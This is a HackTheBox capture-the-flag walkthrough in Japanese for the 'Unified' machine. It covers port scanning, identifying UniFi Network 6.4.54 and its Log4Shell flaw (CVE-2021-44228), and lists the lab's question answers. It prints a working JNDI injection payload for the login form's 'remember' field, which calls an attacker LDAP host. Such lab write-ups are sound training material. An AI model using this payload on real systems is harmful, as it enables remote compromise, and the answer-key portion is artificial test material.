# HackTheBox: Unified Walkthrough

## 1. ポートスキャン

```bash
nmap -sC -sV -p- -oA portscan unified.htb
```

### Q1. 開いているポート
```
22, 6789, 8080, 8443
```

## 2. Webアプリの確認

- ブラウザで `http://unified.htb:8080` にアクセス
- ログインページが表示される
- Webアプリは **UniFi Network Controller v6.4.54**

### Q2. 製品名
```
UniFi Network
```

## 3. 脆弱性調査

```bash
searchsploit unifi 6
# 結果例:
# ssx php/webapps/w9268.java
```

- Google検索: `"unifi 6.4.54 exploit"`
- 見つけた情報:
  - Sprocket Security の記事
  - GitHubリポジトリ: `puzzlepeaches/Log4jUnifi`

### Q3. バージョン
```
6.4.54
```

### Q4. 脆弱性識別子
```
CVE-2021-44228 (Log4Shell)
```

## 4. Exploit準備

- Burp Suite でログインページの通信をキャッチ
- `remember` フィールドに以下のペイロードを挿入：

```text
${jndi:ldap://10.10.16.28:1389/o=tomcat}
```

- 攻撃者側でLDAPリクエストを監視：

```bash
sudo tcpdump -i tun0 port 1389
```

---
